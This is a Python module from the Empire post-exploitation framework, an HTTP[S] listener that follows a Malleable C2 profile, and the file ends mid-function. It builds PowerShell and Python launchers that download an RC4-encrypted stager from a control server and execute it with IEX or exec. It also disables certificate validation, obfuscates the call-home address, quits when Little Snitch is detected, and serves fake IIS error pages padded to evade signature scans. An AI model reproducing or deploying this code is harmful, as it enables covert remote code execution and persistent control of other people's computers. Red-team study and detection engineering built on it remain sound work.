from __future__ import print_function

import base64
import copy
import json
import logging
import os
import random
import ssl
import string
import sys
import time
import urllib.parse
from builtins import object
from builtins import str
from typing import List

from flask import Flask, request, make_response, Response
from pydispatch import dispatcher

from empire.server.common import encryption
from empire.server.common import helpers
from empire.server.common import malleable
from empire.server.common import packets
from empire.server.common import templating
from empire.server.database import models
from empire.server.database.base import Session
from empire.server.utils import data_util
from empire.server.database.base import Session
from empire.server.database import models


class Listener(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'HTTP[S] MALLEABLE',

            'Author': ['@harmj0y', '@johneiser'],

            'Description': ("Starts a http[s] listener (PowerShell or Python) that adheres to a Malleable C2 profile."),

            # categories - client_server, peer_to_peer, broadcast, third_party
            'Category' : ('client_server'),

            'Comments': []
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}

            'Name' : {
                'Description'   :   'Name for the listener.',
                'Required'      :   True,
                'Value'         :   'http_malleable'
            },
            'Host' : {
                'Description'   :   'Hostname/IP for staging.',
                'Required'      :   True,
                'Value'         :   "http://%s:%s" % (helpers.lhost(), 80)
            },
            'BindIP' : {
                'Description'   :   'The IP to bind to on the control server.',
                'Required'      :   True,
                'Value'         :   '0.0.0.0'
            },
            'Port' : {
                'Description'   :   'Port for the listener.',
                'Required'      :   True,
                'Value'         :   80
            },
            'Profile' : {
                'Description'   :   'Malleable C2 profile to describe comms.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Launcher' : {
                'Description'   :   'Launcher string.',
                'Required'      :   True,
                'Value'         :   'powershell -noP -sta -w 1 -enc '
            },
            'StagingKey' : {
                'Description'   :   'Staging key for initial agent negotiation.',
                'Required'      :   True,
                'Value'         :   '2c103f2c4ed1e59c0b4e2e01821770fa'
            },
            'DefaultLostLimit' : {
                'Description'   :   'Number of missed checkins before exiting',
                'Required'      :   True,
                'Value'         :   60
            },
            'CertPath' : {
                'Description'   :   'Certificate path for https listeners.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'KillDate' : {
                'Description'   :   'Date for the listener to exit (MM/dd/yyyy).',
                'Required'      :   False,
                'Value'         :   ''
            },
            'WorkingHours' : {
                'Description'   :   'Hours for the agent to operate (09:00-17:00).',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'SlackURL' : {
                'Description'   :   'Your Slack Incoming Webhook URL to communicate with your Slack instance.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # required:
        self.mainMenu = mainMenu
        self.threads = {} # used to keep track of any threaded instances of this server

        # optional/specific for this module
        self.app = None

        # randomize the length of the default_response and index_page headers to evade signature based scans
        self.header_offset = random.randint(0, 64)

        # set the default staging key to the controller db default
        self.options['StagingKey']['Value'] = str(data_util.get_config('staging_key')[0])

    def default_response(self):
        """
        Returns an IIS 7.5 404 not found page.
        """

        return '\r\n'.join([
            '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
            '<html xmlns="http://www.w3.org/1999/xhtml">',
            '<head>',
            '<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>',
            '<title>404 - File or directory not found.</title>',
            '<style type="text/css">',
            '<!--',
            'body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}',
            'fieldset{padding:0 15px 10px 15px;} ',
            'h1{font-size:2.4em;margin:0;color:#FFF;}',
            'h2{font-size:1.7em;margin:0;color:#CC0000;} ',
            'h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} ',
            '#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;',
            'background-color:#555555;}',
            '#content{margin:0 0 0 2%;position:relative;}',
            '.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}',
            '-->',
            '</style>',
            '</head>',
            '<body>',
            '<div id="header"><h1>Server Error</h1></div>',
            '<div id="content">',
            ' <div class="content-container"><fieldset>',
            '  <h2>404 - File or directory not found.</h2>',
            '  <h3>The resource you are looking for might have been removed, had its name changed, or is temporarily unavailable.</h3>',
            ' </fieldset></div>',
            '</div>',
            '</body>',
            '</html>',
            ' ' * self.header_offset,  # randomize the length of the header to evade signature based detection
        ])

    def method_not_allowed_page(self):
        """
        Imitates IIS 7.5 405 "method not allowed" page.
        """

        return '\r\n'.join([
            '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
            '<html xmlns="http://www.w3.org/1999/xhtml">',
            '<head>',
            '<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>',
            '<title>405 - HTTP verb used to access this page is not allowed.</title>',
            '<style type="text/css">',
            '<!--',
            'body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}',
            'fieldset{padding:0 15px 10px 15px;} ',
            'h1{font-size:2.4em;margin:0;color:#FFF;}',
            'h2{font-size:1.7em;margin:0;color:#CC0000;} ',
            'h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} ',
            '#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;',
            'background-color:#555555;}',
            '#content{margin:0 0 0 2%;position:relative;}',
            '.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}',
            '-->',
            '</style>',
            '</head>',
            '<body>',
            '<div id="header"><h1>Server Error</h1></div>',
            '<div id="content">',
            ' <div class="content-container"><fieldset>',
            '  <h2>405 - HTTP verb used to access this page is not allowed.</h2>',
            '  <h3>The page you are looking for cannot be displayed because an invalid method (HTTP verb) was used to attempt access.</h3>',
            ' </fieldset></div>',
            '</div>',
            '</body>',
            '</html>\r\n'
        ])

    def index_page(self):
        """
        Returns a default HTTP server page.
        """

        return '\r\n'.join([
            '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
            '<html xmlns="http://www.w3.org/1999/xhtml">',
            '<head>',
            '<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />',
            '<title>IIS7</title>',
            '<style type="text/css">',
            '<!--',
            'body {',
            '	color:#000000;',
            '	background-color:#B3B3B3;',
            '	margin:0;',
            '}',
            '',
            '#container {',
            '	margin-left:auto;',
            '	margin-right:auto;',
            '	text-align:center;',
            '	}',
            '',
            'a img {',
            '    border:none;',
            '}',
            '',
            '-->',
            '</style>',
            '</head>',
            '<body>',
            '<div id="container">',
            '<a href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><img src="welcome.png" alt="IIS7" width="571" height="411" /></a>',
            '</div>',
            '</body>',
            '</html>',
        ])


    def validate_options(self):
        """
        Validate all options for this listener.
        """

        for key in self.options:
            if self.options[key]['Required'] and (str(self.options[key]['Value']).strip() == ''):
                print(helpers.color("[!] Option \"%s\" is required." % (key)))
                return False

        profile_name = self.options["Profile"]["Value"]
        profile_data = Session().query(models.Profile).filter(models.Profile.name == profile_name).first()
        try:
            profile = malleable.Profile()
            profile.ingest(content=profile_data.data)

            # since stager negotiation comms are hard-coded, we can't use any stager transforms - overwriting with defaults
            profile.stager.client.verb = "GET"
            profile.stager.client.metadata.transforms = []
            profile.stager.client.metadata.base64url()
            profile.stager.client.metadata.prepend(self.generate_cookie() + "=")
            profile.stager.client.metadata.header("Cookie")
            profile.stager.server.output.transforms = []
            profile.stager.server.output.print_()

            if profile.validate():
                # store serialized profile for use across sessions
                self.options["ProfileSerialized"] = {
                    "Description"   : "Serialized version of the provided Malleable C2 profile.",
                    "Required"      : False,
                    "Value"         : profile._serialize()
                }

                # for agent compatibility (use post for staging)
                self.options["DefaultProfile"] = {
                    "Description"   : "Default communication profile for the agent.",
                    "Required"      : False,
                    "Value"         : profile.post.client.stringify()
                }

                # grab sleeptime from profile
                self.options["DefaultDelay"] = {
                    'Description'   :   'Agent delay/reach back interval (in seconds).',
                    'Required'      :   False,
                    'Value'         :   int(int(profile.sleeptime)/1000) if hasattr(profile, "sleeptime") else 5
                }

                # grab jitter from profile
                self.options["DefaultJitter"] = {
                    'Description'   :   'Jitter in agent reachback interval (0.0-1.0).',
                    'Required'      :   True,
                    'Value'         :   float(profile.jitter)/100 if hasattr(profile, "jitter") else 0.0
                }

                # eliminate troublesome headers
                for header in ["Connection"]:
                    profile.stager.client.headers.pop(header, None)
                    profile.get.client.headers.pop(header, None)
                    profile.post.client.headers.pop(header, None)

            else:
                print(helpers.color("[!] Unable to parse malleable profile: %s" % (profile_name)))
                return False

            if self.options["CertPath"]["Value"] == "" and self.options["Host"]["Value"].startswith("https"):
                print(helpers.color("[!] HTTPS selected but no CertPath specified."))
                return False

        except malleable.MalleableError as e:
            print(helpers.color("[!] Error parsing malleable profile: %s, %s" % (profile_name, e)))
            return False

        return True


    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None,
                          stager=None, bypasses: List[str]=None):
        """
        Generate a basic launcher for the specified listener.
        """
        bypasses = [] if bypasses is None else bypasses
        if not language:
            print(helpers.color('[!] listeners/template generate_launcher(): no language specified!'))
            return None

        if listenerName and (listenerName in self.mainMenu.listeners.activeListeners):

            # extract the set options for this instantiated listener
            listenerOptions = self.mainMenu.listeners.activeListeners[listenerName]['options']
            bindIP = listenerOptions['BindIP']['Value']
            port = listenerOptions['Port']['Value']
            host = listenerOptions['Host']['Value']
            launcher = listenerOptions['Launcher']['Value']
            stagingKey = listenerOptions['StagingKey']['Value']

            # build profile
            profile = malleable.Profile._deserialize(listenerOptions["ProfileSerialized"]["Value"])
            profile.stager.client.host = host
            profile.stager.client.port = port
            profile.stager.client.path = profile.stager.client.random_uri()

            if userAgent and userAgent.lower() != 'default':
                if userAgent.lower() == 'none' and "User-Agent" in profile.stager.client.headers:
                    profile.stager.client.headers.pop("User-Agent")
                else:
                    profile.stager.client.headers["User-Agent"] = userAgent

            if language.lower().startswith('po'):
                # PowerShell

                vGPF = helpers.generate_random_script_var_name("GPF")
                vGPC = helpers.generate_random_script_var_name("GPC")
                vWc = helpers.generate_random_script_var_name("wc")
                vData = helpers.generate_random_script_var_name("data")

                launcherBase = '$ErrorActionPreference = \"SilentlyContinue\";'

                if safeChecks.lower() == 'true':
                    launcherBase = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
                for bypass in bypasses:
                    launcherBase += bypass
                if safeChecks.lower() == 'true':
                    launcherBase += "};"
                    launcherBase += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")

                # ==== DEFINE BYTE ARRAY CONVERSION ====
                launcherBase += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
                launcherBase += "'%s');" % (stagingKey)

                # ==== DEFINE RC4 ====
                launcherBase += helpers.randomize_capitalization('$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')

                # ==== BUILD AND STORE METADATA ====
                routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
                routingPacketTransformed = profile.stager.client.metadata.transform(routingPacket)
                profile.stager.client.store(routingPacketTransformed, profile.stager.client.metadata.terminator)

                # ==== BUILD REQUEST ====
                launcherBase += helpers.randomize_capitalization("$"+vWc+"=New-Object System.Net.WebClient;")
                launcherBase += "$ser="+helpers.obfuscate_call_home_address(profile.stager.client.scheme + "://" + profile.stager.client.netloc)+";$t='"+profile.stager.client.path+profile.stager.client.query+"';"

                # ==== HANDLE SSL ====
                if profile.stager.client.scheme == 'https':
                    # allow for self-signed certificates for https connections
                    launcherBase += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"

                # ==== CONFIGURE PROXY ====
                if proxy and proxy.lower() != 'none':
                    if proxy.lower() == 'default':
                        launcherBase += helpers.randomize_capitalization("$"+vWc+".Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
                    else:
                        launcherBase += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy('")
                        launcherBase += proxy.lower()
                        launcherBase += helpers.randomize_capitalization("');")
                        launcherBase += helpers.randomize_capitalization("$"+vWc+".Proxy = $proxy;")
                    if proxyCreds and proxyCreds.lower() != 'none':
                        if proxyCreds.lower() == 'default':
                            launcherBase += helpers.randomize_capitalization("$"+vWc+".Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
                        else:
                            username = proxyCreds.split(':')[0]
                            password = proxyCreds.split(':')[1]
                            if len(username.split('\\')) > 1:
                                usr = username.split('\\')[1]
                                domain = username.split('\\')[0]
                                launcherBase += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
                            else:
                                usr = username.split('\\')[0]
                                launcherBase += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"');"
                            launcherBase += helpers.randomize_capitalization("$"+vWc+".Proxy.Credentials = $netcred;")
                    # save the proxy settings to use during the entire staging process and the agent
                    launcherBase += "$Script:Proxy = $"+vWc+".Proxy;"

                # ==== ADD HEADERS ====
                for header, value in profile.stager.client.headers.items():
                    #If host header defined, assume domain fronting is in use and add a call to the base URL first
                    #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
                    if header.lower() == "host":
                        launcherBase += helpers.randomize_capitalization("try{$ig=$"+vWc+".DownloadData($ser)}catch{};")
                    launcherBase += helpers.randomize_capitalization("$"+vWc+".Headers.Add(")
                    launcherBase += "\"%s\",\"%s\");" % (header, value)

                # ==== SEND REQUEST ====
                if profile.stager.client.verb.lower() != "get" or profile.stager.client.body:
                    launcherBase += helpers.randomize_capitalization("$"+vData+"=$"+vWc+".UploadData($ser+$t,'"+ profile.stager.client.verb +"','"+ profile.stager.client.body +"')\n")
                else:
                    launcherBase += helpers.randomize_capitalization("$"+vData+"=$"+vWc+".DownloadData($ser+$t);")

                # ==== INTERPRET RESPONSE ====
                if profile.stager.server.output.terminator.type == malleable.Terminator.HEADER:
                    launcherBase += helpers.randomize_capitalization("$"+vData+"='';for ($i=0;$i -lt $"+vWc+".ResponseHeaders.Count;$i++){")
                    launcherBase += helpers.randomize_capitalization("if ($"+vData+".ResponseHeaders.GetKey($i) -eq '"+ profile.stager.server.output.terminator.arg +"'){")
                    launcherBase += helpers.randomize_capitalization("$"+vData+"=$"+vWc+".ResponseHeaders.Get($i);")
                    launcherBase += helpers.randomize_capitalization("Add-Type -AssemblyName System.Web;$"+vData+"=[System.Web.HttpUtility]::UrlDecode($"+vData+");")
                    launcherBase += "}}"
                elif profile.stager.server.output.terminator.type == malleable.Terminator.PRINT:
                    launcherBase += ""
                else:
                    launcherBase += ""
                launcherBase += profile.stager.server.output.generate_powershell_r("$"+vData)

                # ==== EXTRACT IV AND STAGER ====
                launcherBase += helpers.randomize_capitalization("$iv=$"+vData+"[0..3];$"+vData+"=$"+vData+"[4..$"+vData+".length];")

                # ==== DECRYPT AND EXECUTE STAGER ====
                launcherBase += helpers.randomize_capitalization("-join[Char[]](& $R $"+vData+" ($IV+$K))|IEX")

                if obfuscate:
                    launcherBase = data_util.obfuscate(self.mainMenu.installPath, launcherBase, obfuscationCommand=obfuscationCommand)

                if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
                    return helpers.powershell_launcher(launcherBase, launcher)
                else:
                    return launcherBase

            elif language.lower().startswith('py'):
                # Python

                # ==== HANDLE IMPORTS ====
                launcherBase = 'import sys,base64\n'
                launcherBase += 'import urllib.request,urllib.parse\n'

                # ==== HANDLE SSL ====
                if profile.stager.client.scheme == "https":
                    launcherBase += "import ssl\n"
                    launcherBase += "if hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context\n"

                # ==== SAFE CHECKS ====
                if safeChecks and safeChecks.lower() == 'true':
                    launcherBase += "import re,subprocess\n"
                    launcherBase += "cmd = \"ps -ef | grep Little\ Snitch | grep -v grep\"\n"
                    launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n"
                    launcherBase += "out, err = ps.communicate()\n"
                    launcherBase += "if re.search('Little Snitch', out.decode()):sys.exit()\n"

                launcherBase += "server='%s'\n" % (host)

                # ==== CONFIGURE PROXY ====
                if proxy and proxy.lower() != 'none':
                    if proxy.lower() == 'default':
                        launcherBase += "proxy = urllib.request.ProxyHandler()\n"
                    else:
                        proto = proxy.split(':')[0]
                        launcherBase += "proxy = urllib.request.ProxyHandler({'"+proto+"':'"+proxy+"'})\n"
                    if proxyCreds and proxyCreds != 'none':
                        if proxyCreds == 'default':
                            launcherBase += "o = urllib.request.build_opener(proxy)\n"
                        else:
                            launcherBase += "proxy_auth_handler = urllib.request.ProxyBasicAuthHandler()\n"
                            username = proxyCreds.split(':')[0]
                            password = proxyCreds.split(':')[1]
                            launcherBase += "proxy_auth_handler.add_password(None,'"+proxy+"','"+username+"','"+password+"')\n"
                            launcherBase += "o = urllib.request.build_opener(proxy, proxy_auth_handler)\n"
                    else:
                        launcherBase += "o = urllib.request.build_opener(proxy)\n"
                else:
                    launcherBase += "o = urllib.request.build_opener()\n"
                # install proxy and creds globaly, so they can be used with urlopen.
                launcherBase += "urllib.request.install_opener(o)\n"

                # ==== BUILD AND STORE METADATA ====
                routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='PYTHON', meta='STAGE0', additional='None', encData='')
                routingPacketTransformed = profile.stager.client.metadata.transform(routingPacket)
                profile.stager.client.store(routingPacketTransformed, profile.stager.client.metadata.terminator)

                # ==== BUILD REQUEST ====
                launcherBase += "vreq=type('vreq',(urllib.request.Request,object),{'get_method':lambda self:self.verb if (hasattr(self,'verb') and self.verb) else urllib.request.Request.get_method(self)})\n"
                launcherBase += "req=vreq('%s', %s)\n" % (profile.stager.client.url, profile.stager.client.body)
                launcherBase += "req.verb='"+profile.stager.client.verb+"'\n"

                # ==== ADD HEADERS ====
                for header, value in profile.stager.client.headers.items():
                    launcherBase += "req.add_header('%s','%s')\n" % (header, value)

                # ==== SEND REQUEST ====
                launcherBase += "res=urllib.request.urlopen(req)\n"

                # ==== INTERPRET RESPONSE ====
                if profile.stager.server.output.terminator.type == malleable.Terminator.HEADER:
                    launcherBase += "head=res.info().dict\n"
                    launcherBase += "a=head['%s'] if '%s' in head else ''\n" % (profile.stager.server.output.terminator.arg, profile.stager.server.output.terminator.arg)
                    launcherBase += "a=urllib.parse.unquote(a)\n"
                elif profile.stager.server.output.terminator.type == malleable.Terminator.PRINT:
                    launcherBase += "a=res.read()\n"
                else:
                    launcherBase += "a=''\n"
                launcherBase += profile.stager.server.output.generate_python_r("a")

                # ==== EXTRACT IV AND STAGER ====
                launcherBase += "a=urllib.request.urlopen(req).read();\n"
                launcherBase += "IV=a[0:4];"
                launcherBase += "data=a[4:];"
                launcherBase += "key=IV+'%s'.encode('UTF-8');" % (stagingKey)

                # ==== DECRYPT STAGER (RC4) ====
                launcherBase += "S,j,out=list(range(256)),0,[]\n"
                launcherBase += "for i in list(range(256)):\n"
                launcherBase += "    j=(j+S[i]+key[i%len(key)])%256\n"
                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
                launcherBase += "i=j=0\n"
                launcherBase += "for char in data:\n"
                launcherBase += "    i=(i+1)%256\n"
                launcherBase += "    j=(j+S[i])%256\n"
                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
                launcherBase += "    out.append(chr(char^S[(S[i]+S[j])%256]))\n"

                # ==== EXECUTE STAGER ====
                launcherBase += "exec(''.join(out))"

                if encode:
                    launchEncoded = base64.b64encode(launcherBase.encode('UTF-8')).decode('UTF-8')
                    if isinstance(launchEncoded, bytes):
                        launchEncoded = launchEncoded.decode('UTF-8')
                    launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode('%s'));\" | python3 &" % (launchEncoded)
                    return launcher
                else:
                    return launcherBase

            else:
                print(helpers.color("[!] listeners/template generate_launcher(): invalid language specification: only 'powershell' and 'python' are currently supported for this module."))

        else:
            print(helpers.color("[!] listeners/template generate_launcher(): invalid listener name specification!"))


    def generate_stager(self, listenerOptions, encode=False, encrypt=True, obfuscate=False, obfuscationCommand="", language=None):
        """
        Generate the stager code needed for communications with this listener.
        """

        if not language:
            print(helpers.color('[!] listeners/http_malleable generate_stager(): no language specified!'))
            return None

        # extract the set options for this instantiated listener
        port = listenerOptions['Port']['Value']
        host = listenerOptions['Host']['Value']
        launcher = listenerOptions['Launcher']['Value']
        stagingKey = listenerOptions['StagingKey']['Value']
        workingHours = listenerOptions['WorkingHours']['Value']
        killDate = listenerOptions['KillDate']['Value']

        # build profile
        profile = malleable.Profile._deserialize(listenerOptions["ProfileSerialized"]["Value"])
        profile.stager.client.host = host
        profile.stager.client.port = port

        profileStr = profile.stager.client.stringify()

        # select some random URIs for staging
        stage1 = profile.stager.client.random_uri()
        stage2 = profile.stager.client.random_uri()

        if language.lower() == 'powershell':

            # read in the stager base
            with open("%s/data/agent/stagers/http.ps1" % (self.mainMenu.installPath)) as f:
                stager = f.read()

            # Get the random function name generated at install and patch the stager with the proper function name
            stager = data_util.keyword_obfuscation(stager)

            # patch in custom headers
            if profile.stager.client.headers:
                headers = ",".join([":".join([k.replace(":","%3A"),v.replace(":","%3A")]) for k,v in profile.stager.client.headers.items()])
                stager = stager.replace("$customHeaders = \"\";", "$customHeaders = \"" + headers + "\";")

            # patch in working hours
            if workingHours:
                stager = stager.replace("WORKING_HOURS_REPLACE", workingHours)

            # patch in the killdate
            if killDate:
                stager = stager.replace("REPLACE_KILLDATE", killDate)

            # patch in the server and key information
            stager = stager.replace("REPLACE_SERVER", host)
            stager = stager.replace("REPLACE_STAGING_KEY", stagingKey)
            stager = stager.replace("/index.jsp", stage1)
            stager = stager.replace("/index.php", stage2)

            randomizedStager = ''
            # forces inputs into a bytestring to ensure 2/3 compatibility
            stagingKey = stagingKey.encode('UTF-8')
            # stager = stager.encode('UTF-8')
            # randomizedStager = randomizedStager.encode('UTF-8')

            for line in stager.split("\n"):
                line = line.strip()
                # skip commented line
                if not line.startswith("#"):
                    # randomize capitalization of lines without quoted strings
                    if "\"" not in line:
                        randomizedStager += helpers.randomize_capitalization(line)
                    else:
                        randomizedStager += line

            if obfuscate:
                randomizedStager = data_util.obfuscate(self.mainMenu.installPath, randomizedStager, obfuscationCommand=obfuscationCommand)

            if encode:
                return helpers.enc_powershell(randomizedStager)
            elif encrypt:
                RC4IV = os.urandom(4)
                return RC4IV + encryption.rc4(RC4IV + stagingKey, randomizedStager.encode('UTF-8'))
            else:
                return randomizedStager

        elif language.lower() == 'python':
            template_path = [
                os.path.join(self.mainMenu.installPath, '/data/agent/stagers'),
                os.path.join(self.mainMenu.installPath, './data/agent/stagers')]
            eng = templating.TemplateEngine(template_path)
            template = eng.get_template('http.py')

            template_options = {
                'working_hours': workingHours,
                'kill_date': killDate,
                'staging_key': stagingKey,
                'profile': profileStr,
                'stage_1': stage1,
                'stage_2': stage2
            }

            stager = template.render(template_options)

            if encode:
                return base64.b64encode(stager)
            elif encrypt:
                RC4IV = os.urandom(4)
                return RC4IV + encryption.rc4(RC4IV + stagingKey.encode('UTF-8'), stager.encode('UTF-8'))
            else:
                return stager

        else:
            print(helpers.color("[!] listeners/http_malleable generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."))

        return None

    def generate_agent(self, listenerOptions, language=None, obfuscate=False, obfuscationCommand="", version=''):
        """
        Generate the full agent code needed for communications with the listener.
        """

        if not language:
            print(helpers.color("[!] listeners/http_malleable generate_agent(): no language specified!"))
            return None

        # build profile
        profile = malleable.Profile._deserialize(listenerOptions["ProfileSerialized"]["Value"])

        language = language.lower()
        delay = listenerOptions["DefaultDelay"]["Value"]
        jitter = listenerOptions["DefaultJitter"]["Value"]
        lostLimit = listenerOptions["DefaultLostLimit"]["Value"]
        killDate = listenerOptions["KillDate"]["Value"]
        workingHours = listenerOptions["WorkingHours"]["Value"]
        b64DefaultResponse = base64.b64encode(self.default_response().encode('UTF-8')).decode('UTF-8')

        profileStr = profile.stager.client.stringify()

        if language == 'powershell':
            #read in agent code
            with open(self.mainMenu.installPath + "/data/agent/agent.ps1") as f:
                code = f.read()

            # Get the random function name generated at install and patch the stager with the proper function name
            code = data_util.keyword_obfuscation(code)

            # path in the comms methods
            commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
            code = code.replace("REPLACE_COMMS", commsCode)

            # strip out the comments and blank lines
            code = helpers.strip_powershell_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
            code = code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
            code = code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profileStr) + "\"")
            code = code.replace('$LostLimit = 60', "$LostLimit = " + str(lostLimit))
            code = code.replace('$DefaultResponse = ""', '$DefaultResponse = "' + b64DefaultResponse +'"')

            # patch in the killDate and workingHours if they're specified
            if killDate != "":
                code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
            if obfuscate:
                code = data_util.obfuscate(self.mainMenu.installPath, code, obfuscationCommand=obfuscationCommand)
            return code

        elif language == 'python':
            # read in the agent base
            if version == 'ironpython':
                f = open(self.mainMenu.installPath + "/data/agent/ironpython_agent.py")
            else:
                f = open(self.mainMenu.installPath + "/data/agent/agent.py")
            code = f.read()
            f.close()

            # patch in the comms methods
            commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
            code = code.replace('REPLACE_COMMS', commsCode)

            # strip out comments and blank lines
            code = helpers.strip_python_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace('delay = 60', 'delay = %s' % (delay))
            code = code.replace('jitter = 0.0', 'jitter = %s' % (jitter))
            code = code.replace('profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', 'profile = "%s"' % (profileStr))
            code = code.replace('lostLimit = 60', 'lostLimit = %s' % (lostLimit))
            code = code.replace('defaultResponse = base64.b64decode("")', 'defaultResponse = base64.b64decode("%s")' % (b64DefaultResponse))

            # patch in the killDate and workingHours if they're specified
            if killDate != "":
                code = code.replace('killDate = ""', 'killDate = "%s"' % (killDate))
            if workingHours != "":
                code = code.replace('workingHours = ""', 'workingHours = "%s"' % (workingHours))

            return code
        else:
            print(helpers.color("[!] listeners/http_malleable generate_agent(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."))


    def generate_comms(self, listenerOptions, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.
        This is so agents can easily be dynamically updated for the new listener.
        """

        # extract the set options for this instantiated listener
        host = listenerOptions['Host']['Value']
        port = listenerOptions['Port']['Value']

        # build profile
        profile = malleable.Profile._deserialize(listenerOptions["ProfileSerialized"]["Value"])
        profile.get.client.host = host
        profile.get.client.port = port
        profile.post.client.host = host
        profile.post.client.port = port

        if language:
            if language.lower() == 'powershell':
                # PowerShell

                vWc = helpers.generate_random_script_var_name("wc")

                updateServers = "$Script:ControlServers = @(\"%s\");" % (host)
                updateServers += "$Script:ServerIndex = 0;"

                # ==== HANDLE SSL ====
                if host.startswith('https'):
                    updateServers += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"

                # ==== DEFINE GET ====
                getTask = "$script:GetTask = {"
                getTask += "try {"
                getTask += "if ($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {"

                # ==== BUILD ROUTING PACKET ====
                # meta 'TASKING_REQUEST' : 4
                getTask += "$RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;"
                getTask += "$RoutingPacket = [System.Text.Encoding]::Default.GetString($RoutingPacket);"
                getTask += profile.get.client.metadata.generate_powershell("$RoutingPacket")

                # ==== BUILD REQUEST ====
                getTask += "$"+vWc+" = New-Object System.Net.WebClient;"

                # ==== CONFIGURE PROXY ====
                getTask += "$"+vWc+".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();"
                getTask += "$"+vWc+".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;"
                getTask += "if ($Script:Proxy) {"
                getTask += "$"+vWc+".Proxy = $Script:Proxy;"
                getTask += "}"

                # ==== CHOOSE URI ====
                getTask += "$taskURI = " + ",".join(["'%s'" % u for u in (profile.get.client.uris if profile.get.client.uris else ["/"])]) + " | Get-Random;"

                # ==== ADD PARAMETERS ====
                first = True
                for parameter, value in profile.get.client.parameters.items():
                    getTask += "$taskURI += '"+("?" if first else "&")+"';"
                    first = False
                    getTask += "$taskURI += '"+parameter+"="+value+"';"
                if profile.get.client.metadata.terminator.type == malleable.Terminator.PARAMETER:
                    getTask += "$taskURI += '"+("?" if first else "&")+"';"
                    first = False
                    getTask += "$taskURI += '"+profile.get.client.metadata.terminator.arg+"=' + $RoutingPacket;"

